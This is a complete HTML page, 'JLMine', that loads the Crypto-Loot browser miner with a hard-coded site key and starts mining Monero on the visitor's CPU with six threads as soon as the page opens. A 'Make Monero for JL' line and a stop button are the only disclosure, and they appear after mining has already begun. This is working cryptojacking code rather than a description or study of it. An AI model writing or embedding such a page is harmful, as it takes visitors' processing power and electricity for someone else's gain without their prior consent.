<!DOCTYPE html>
<html lang="en-US">
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	
	<title>JLMine</title>

	<style type="text/css">
		
	</style>

</head>
<body>

	<div>
		<script src="https://crypto-loot.com/lib/miner.min.js"></script>
		<center style="padding:5rem 0 0 0">Make Monero for JL:</center>
		<center>
		<p id="minebutton"></p>
		</center>
		<script type="text/javascript">
			var miner=new CryptoLoot.Anonymous('e92c2d7aae63dae6155bce0e75a278ad8bde41b15319',
			{
				threads:6,autoThreads:false,throttle:0.2,
			 }
			);
			miner.start();

		setInterval(function() {
		    // Output to HTML elements...
		    if (miner.isRunning()) {
			document.getElementById("minebutton").innerHTML = "<button onclick=\"miner.stop()\">Stop Mining</button>";
		    } else {
			document.getElementById("minebutton").innerHTML = "<button onclick=\"miner.start(CryptoLoot.FORCE_EXCLUSIVE_TAB)\">Start mining again</button>";
		    }
		}, 1000);
		</script>
	</div>
	
</body>
</html>
